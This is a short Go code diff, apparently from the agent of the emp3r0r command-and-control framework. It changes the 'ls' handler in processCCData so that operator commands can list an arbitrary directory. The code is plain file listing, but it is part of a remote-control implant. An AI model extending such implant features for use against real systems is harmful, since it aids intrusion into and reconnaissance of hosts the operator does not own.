@@ -97,17 +97,19 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 
 		// ls current path
 	case "ls":
-		if len(cmdSlice) != 1 {
-			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
-			return
+		target_dir := "."
+		if len(cmdSlice) > 1 && !strings.HasPrefix(cmdSlice[1], "--") {
+			target_dir = cmdSlice[1]
+		} else {
+			target_dir, err = os.Getwd()
+			if err != nil {
+				log.Printf("cwd: %v", err)
+				sendResponse(err.Error())
+				return
+			}
 		}
-		cwd, err := os.Getwd()
-		if err != nil {
-			log.Printf("cwd: %v", err)
-			sendResponse(err.Error())
-			return
-		}
-		out, err = util.LsPath(cwd)
+		log.Printf("Listing %s", target_dir)
+		out, err = util.LsPath(target_dir)
 		if err != nil {
 			out = err.Error()
 		}
